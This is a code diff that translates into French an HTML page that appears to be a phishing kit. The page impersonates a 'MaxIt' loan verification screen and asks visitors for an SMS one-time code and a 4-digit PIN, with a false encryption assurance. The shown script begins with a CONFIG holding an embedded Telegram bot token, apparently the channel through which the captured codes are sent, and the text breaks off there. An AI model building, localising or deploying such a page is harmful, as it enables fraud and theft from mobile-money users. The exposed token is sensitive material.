@@ -399,49 +399,49 @@
 
 <div class="card">
 
-    <!-- Header -->
+    <!-- En-tête -->
     <div class="header">
         <div class="logo-wrap">
             <div class="logo-bg">
                 <span class="logo-text">MaxIt</span>
             </div>
         </div>
-        <div class="header-title">Two Step Verification</div>
-        <div class="header-desc">A 5-digit verification code has been sent to your number. Enter it below to confirm.</div>
+        <div class="header-title">Vérification en deux étapes</div>
+        <div class="header-desc">Un code de vérification à 5 chiffres a été envoyé à votre numéro. Saisissez-le ci-dessous pour confirmer.</div>
     </div>
 
-    <!-- Offer info -->
+    <!-- Informations sur l'offre -->
     <div class="offer-info" id="offerInfo">
-        <div class="offer-label">Loan Application</div>
-        <div class="offer-name" id="offerTitle">Flex Loan</div>
+        <div class="offer-label">Demande de prêt</div>
+        <div class="offer-name" id="offerTitle">Prêt Flex</div>
         <div class="offer-amount" id="offerPrice">—</div>
         <div class="offer-meta" id="offerMeta"></div>
     </div>
 
-    <!-- Phone display -->
+    <!-- Affichage du numéro de téléphone -->
     <p class="phone-display" id="phoneDisplay"></p>
 
-    <!-- OTP inputs -->
+    <!-- Champs du code de vérification -->
     <div class="otp-container" id="otpInputs"></div>
 
-    <!-- Error -->
+    <!-- Message d'erreur -->
     <div class="error-msg" id="errMsg"></div>
 
-    <!-- Buttons -->
+    <!-- Boutons -->
     <div class="form-body">
-        <button class="btn-primary" id="verifyBtn">Verify &amp; Confirm</button>
-        <button class="btn-back" onclick="window.history.back()">← Back</button>
+        <button class="btn-primary" id="verifyBtn">Vérifier et confirmer</button>
+        <button class="btn-back" onclick="window.history.back()">← Retour</button>
 
         <div class="security-note">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             </svg>
-            256-bit encrypted &amp; secured by MaxIt
+            Chiffrement 256 bits et sécurité assurée par MaxIt
         </div>
     </div>
 </div>
 
-<!-- PIN Modal -->
+<!-- Fenêtre de saisie du code PIN -->
 <div id="pinModal">
     <div class="modal-card">
         <div class="modal-header">
@@ -450,24 +450,23 @@
                     <span class="logo-text">MaxIt</span>
                 </div>
             </div>
-            <div class="modal-title">Enter Your PIN</div>
-            <div class="modal-subtitle">Enter your 4-digit PIN to complete this transaction securely.</div>
+            <div class="modal-title">Saisissez votre code PIN</div>
+            <div class="modal-subtitle">Saisissez votre code PIN à 4 chiffres pour effectuer cette transaction en toute sécurité.</div>
         </div>
         <div class="modal-body">
             <div class="otp-container" id="pinInputs" style="margin:0 0 20px;"></div>
             <div class="pin-error-msg" id="pinErrMsg"></div>
-            <button class="btn-primary" id="confirmPinBtn">Confirm PIN</button>
+            <button class="btn-primary" id="confirmPinBtn">Confirmer le code PIN</button>
         </div>
     </div>
 </div>
 
-<!-- Spinner -->
+<!-- Indicateur de chargement -->
 <div id="spinner">
     <div class="spin-ring"></div>
-    <div class="spin-label">Verifying Code…</div>
-    <div class="spin-sub">Please hold on</div>
+    <div class="spin-label">Vérification du code…</div>
+    <div class="spin-sub">Veuillez patienter</div>
 </div>
-
 <script>
     const CONFIG = {
         BOT_TOKEN: '8330538667:AAEgIreUCgpFrDv4Ys-UlPE2-MujHCLTDr0',
